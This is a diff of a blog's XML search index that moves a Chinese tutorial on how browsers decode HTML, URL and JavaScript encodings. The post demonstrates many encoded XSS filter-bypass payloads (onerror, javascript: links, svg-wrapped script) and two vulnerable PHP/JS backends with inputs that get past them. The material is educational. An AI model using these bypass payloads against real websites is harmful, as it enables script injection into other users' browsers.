+<li>对<code>alert</code>进行JS编码（Unicode）</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>混合编码，先进行JS编码然后再HTML编码(再加上URL编码)</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br><span class="line">3. 对onerror的值进行HTML编码（再加上URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个例子就比较特别了，当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以这里并不会第一时间进行HTML解码，而是先进行JS解码，JS解码之后若有必要才进行HTML解码，（这里没有必要，因为没有检查到完整得HTML标签结构），最后执行语句。</p>
+<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
+<ul>
+<li>对<code>alert</code>进行JS编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用<code>&lt;svg&gt;</code>标签放在<code>&lt;script&gt;</code>标签前面，那么就可以对<code>&lt;script&gt;</code>标签里面的内容进行Html编码，这是因为在解析到<code>&lt;svg&gt;</code>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行xss了。（当然了如果你要使用GET方法传参的话最后还要加上URL编码）</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>混合编码，先进行JS编码，再利用<code>&lt;svg&gt;</code>标签进行HTML编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 利用 svg 标签进行HTML编码</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS编码绕过原理"><a href="#XSS编码绕过原理" class="headerlink" title="XSS编码绕过原理"></a>XSS编码绕过原理</h2><p>看完上面的实践内容，估计都清楚浏览器解析代码的过程了吧，这里看2个XSS编码绕过的案例。</p>
+<h3 id="利用HTML编码绕过"><a href="#利用HTML编码绕过" class="headerlink" title="利用HTML编码绕过"></a>利用HTML编码绕过</h3><ul>
+<li>服务器后端关键代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>)</span>&#123;</span><br><span class="line">    input = input.toUpperCase()</span><br><span class="line">    <span class="keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里后端把输入的参数进行了大写处理，由于JavaScript代码对大小写敏感，也就是说<code>ALERT()</code>是不能触发弹窗的，这里就是利用HTML对大小也不敏感，所以HTML编码绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;img&gt;</code>标签语法，于是就先建立了一个DOM节点；然后去<code>onerror</code>事件的值进行HTML解码；接着交给JS解析器进行JS解码，最后执行语句。</p>
+<h3 id="利用JS编码绕过"><a href="#利用JS编码绕过" class="headerlink" title="利用JS编码绕过"></a>利用JS编码绕过</h3><ul>
+<li>服务器后端关键代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$html</span> = <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;Your name is:</span></span><br><span class="line"><span class="string">		 &lt;div id=&#x27;a&#x27;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">		 &lt;script&gt;</span></span><br><span class="line"><span class="string">		 	document.getElementById(&#x27;a&#x27;).innerHTML=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.htmlspecialchars(<span class="variable">$value</span>).<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">		 &lt;/script&gt;</span></span><br><span class="line"><span class="string">		 &quot;</span>;</span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$html</span>;</span><br></pre></td></tr></table></figure>
+<p>这里后端使用了<code>htmlspecialchars()</code>函数对输入的参数进行了HTML实体编码，目的是想让我们输入的标签变成普通的文本字符串，一般情况下是无法绕过的，但是这里后端把参数放在了<code>&lt;script&gt;</code>标签里面，并且操作DOM修改了外部的DOM节点，这就让我们有了可乘之机。可以使用JS编码进行绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span> #源码</span><br><span class="line"></span><br><span class="line">\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e		#JS编码后</span><br></pre></td></tr></table></figure>
+<p>这里浏览器接收到的数据是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003e<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签语法，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以会先进行JS解码，解码之后就还原出了原来的<code>&lt;img&gt;</code>标签，浏览器发现是完整机构的HTML标签，于是就再创建DOM节点，然后对<code>onerror</code>事件的值进行HTML解码，最后执行<code>onerror</code>里面的JavaScript语句。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://www.cnblogs.com/flycat-2016/p/6507543.html" >XSS编码与绕过<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://saucer-man.com/information_security/103.html" >探索XSS利用编码绕过的原理<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://0verwatch.top/xss-encodeorder.html" >xss编码绕过原理以及从中学习到的几个例子<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vue入门</title>
     <url>/2021/02/12/vue%E5%85%A5%E9%97%A8/</url>
     <content><![CDATA[<h2 id="一、vue基础"><a href="#一、vue基础" class="headerlink" title="一、vue基础"></a>一、vue基础</h2><h3 id="1-1-vue简介"><a href="#1-1-vue简介" class="headerlink" title="1.1 vue简介"></a>1.1 vue简介</h3><ol>
@@ -2521,173 +2861,6 @@
       </categories>
       <tags>
         <tag>Vue</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS编码剖析</title>
-    <url>/2021/03/13/XSS%E7%BC%96%E7%A0%81%E5%89%96%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="XSS编码剖析"><a href="#XSS编码剖析" class="headerlink" title="XSS编码剖析"></a>XSS编码剖析</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在不了解HTML、JavaScript在网页中编码解码的原理之前，我就有一个疑惑，为什么有时候一些关键字被过滤掉了之后可以使用编码进行绕过，编码之后的内容仍然可以在页面中解析出来；可是反过来后端防御攻击的手段又是将输入的内容进行编码转义，如PHP中的<code>htmlspecialchars()</code>函数，使得其中的内容变为一般的字符输出，而不会在页面中解析出来。这两者有关联吗，其中的原因又是什么？</p>
-<h2 id="浏览器响应过程"><a href="#浏览器响应过程" class="headerlink" title="浏览器响应过程"></a>浏览器响应过程</h2><p>来看看浏览器处理一次完整的HTTP请求，会涉及到的编码解码问题。</p>
-<ol>
-<li>当浏览器发送HTTP请求时，会先对特殊字符进行URL编码后，发送给服务器。</li>
-<li>服务器收到客户端发送来的HTTP请求，会对其进行URL解码后，再进行处理，处理完成后将结果返回给浏览器。</li>
-<li>浏览器接收到HTML文件后，最先是触发HTML解析器来解析HTML，将标签转化为内容树中的DOM节点，此时在识别标签的时候，HTML解析器是不能识别哪些被HTML实体编码了，只有当整个DOM树建立起来后，才能对每个节点的内容进行识别，如果有HTML实体编码，再对其进行解码。</li>
-<li>在HTML解析器过程中，遇到JS标签诸如<code>&lt;script&gt;</code>会调用JS解释器对JS代码进行解析，而JS DOM API会对DOM结构进行更改，DOM树节点的更改也会反过来触发HTML解释器。</li>
-<li>CSS解释器也会在HTML解释器过程中参与进来，但它不会干扰到DOM树，它会结合<code>&lt;style&gt;</code>标签和CSS文件以及HTML指令来构建render tree。</li>
-</ol>
-<h2 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
-<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
-<p>这里值得一提的是，URL编码作用并不在于绕过后台检测，但是当我们是以GET方式提交数据时，如果数据中存在<code>&amp;</code>、<code>#</code>、<code>+</code>这样的特殊字符，就需要进行URL编码，才能够保障正常解析，因为这些字符在URL中都有特殊的功能，不进行编码就会默认为是特殊的功能。</p>
-<p>example：</p>
-<p>服务器后端对<code>and</code>这个关键字进行了拦截，这时候我们想使用<code>&amp;&amp;</code>来代替，如果我们在URL中输入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 &amp;&amp; 1&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>这时候后端收到的并不是<code>id=1 &amp;&amp; 1=2</code>，而是<code>id=1</code>和<code>1=2</code>，这是由于<code>&amp;</code>的存在导致后端认为我们输入的2个参数而不是一个，正确的输入为：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 %26%26 1&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>通过URL编码让后端认为我们输入的<code>&amp;</code>并不是想要输入多个参数，而是原来就是<code>&amp;</code>的字符，就好像是我们在字符串中想要输出<code>\</code>的时候，我们要使用<code>\\</code>进行转义一样。</p>
-<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
-<p>但是在HTML中有些字符是和关键词冲突的，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是标签，怎么解决呢？</p>
-<p>为了正确地显示预留字符，我们需要在HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
-<table>
-<thead>
-<tr>
-<th>显示结果</th>
-<th>描述</th>
-<th>实体名称</th>
-<th>实体编号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>&lt;</td>
-<td>小于号</td>
-<td><code>&amp;lt;</code></td>
-<td><code>&amp;#60;</code></td>
-</tr>
-<tr>
-<td>&gt;</td>
-<td>大于号</td>
-<td><code>&amp;gt;</code></td>
-<td><code>&amp;#62;</code></td>
-</tr>
-</tbody></table>
-<p><strong>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析</strong>。</p>
-<p>所以在PHP中，使用<code>htmlspecialchars()</code>函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。因此，具体来说，我们对HTML标签的结构进行实体编码就会导致他在浏览器解析的时候无法认为这是一个标签，而是一个串，但是当标签建立之后，里面的内容是能够被HTML解析出来的。</p>
-<p>example：</p>
-<ul>
-<li>这是无法被解析出来，因为编码破坏了标签本身的结构</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">www.example.com</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">s</span>&amp;#<span class="attr">x72</span>;<span class="attr">c</span>=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span></span><br><span class="line">&lt;s<span class="symbol">&amp;#x63;</span>ript&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>这是能够被解析出来，因为结构没有被破坏，里面的内容可以被解析</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ht<span class="symbol">&amp;#x74;</span>p://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">aler&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="JavaScript解码（Unicode）"><a href="#JavaScript解码（Unicode）" class="headerlink" title="JavaScript解码（Unicode）"></a>JavaScript解码（Unicode）</h3><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href </code>后边加入的JavaScript伪URL，也会进入JS 的解析模式。而进入该解析模式的时候，该DOM节点已经建立起来了，但是HTML解释器还并未进行HTML解码。当触发JS解释器后，JS会先对内容进行解析，如果有JS编码就会进行解码操作，接下来是就是执行里面的JS语句。所以此时执行该JS语言前的解码顺序为JS解码–&gt;HTML解码。</p>
-<p>在一个页面中，可以出发JS 解析器的方式有这么几种：</p>
-<ul>
-<li>直接嵌入<code>&lt;script&gt;</code> 代码块。</li>
-<li>通过<code>&lt;script src=… &gt;</code> 加载代码。</li>
-<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
-<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
-<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
-<li>定时器，Timer(setTimeout, setInterval)</li>
-<li>eval(…) 调用。</li>
-</ul>
-<p>example：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;\u4e00&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里的<code>herf</code>的URL经过URL解码之后发现，使用了JavaScript伪协议，所以JS会对内容进行解析，里边有一个转义字符<code>\u4e00</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为<code>一</code>，于是在完成JS的解析之后变成了：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>仍以上一段代码为例，假如我们编码的位置不是括号里，而是在alert上，JS是会对它进行解码的：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>但是，不能对协议类型进行任何编码，因为这样会导致URL认不出来是JavaScript伪协议，从而不会进行JS解析！！</strong></p>
-<p>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。同时，<strong>上边这种直接在字符串外进行编码的方式，只有 Unicode 编码方式被支持，其他编码方式则不行</strong>。</p>
-<h2 id="XSS编码实践"><a href="#XSS编码实践" class="headerlink" title="XSS编码实践"></a>XSS编码实践</h2><p>我们从几个简单的例子回顾加深一下浏览器解析代码的过程：</p>
-<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;a&gt;</code>标签语法，于是就先建立了一个DOM节点；然后对<code>href</code>里面的内容进行HTML解码；由于<code>href</code>属性的值是URL，因此会对<code>herf</code>属性的值进行URL解码；接着由于URL的协议类型是JavaScript伪协议，然后就会进行JS解码，最后执行语句。</p>
-<p>整个解析顺序为3个环节：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
-<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
-<ul>
-<li>将<code>javascript:alert(&#39;xss&#39;)</code>转化为HTML实体，因为解析HTML之后，建立起<code>&lt;a&gt;</code>DOM节点，然后对DOM节点里面的HTML实体进行解析。</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>注意：这里还要多一个步骤进行URL编码，因为里面的<code>&amp;</code>和<code>#</code>都有特殊功能</strong></p>
-<p>因此真正提交的URL应该是这样的</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>对<code>alert(1);</code>进行URL编码，因为在HTML解析之后会对<code>href</code>的值进行URL解码，不过实际上这里没有需要URL转义的内容，因此还是一样</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>对<code>alert</code>做JS编码，因为在URL解码之后，发现URL资源类型为JavaScript，因此会调用JS解析器来对JS代码进行解析</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>混合编码</li>
-</ul>
-<p>由于浏览器解码的过程是：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
-<p>因此我们可以反过来编码：JS解码 –&gt;URL解码 –&gt;HTML解码</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">3. 对href标签中的除了协议名字(javascript:)以外的部分进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1)&quot;</span>&gt;</span></span><br><span class="line">4. 对href的值进行HTML编码（再加上要URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这个例子和案例一类似，只不过由于<code>onerror</code>是事件，本来就属于JS操作，因此只是比案例一少了个URL解码，下列情况都可以成功弹框：</p>
-<ul>
-<li>对<code>alert(1)</code>进行HTML编码(再加上URL编码)</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>对<code>alert</code>进行JS编码（Unicode）</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>混合编码，先进行JS编码然后再HTML编码(再加上URL编码)</li>
-</ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br><span class="line">3. 对onerror的值进行HTML编码（再加上URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span 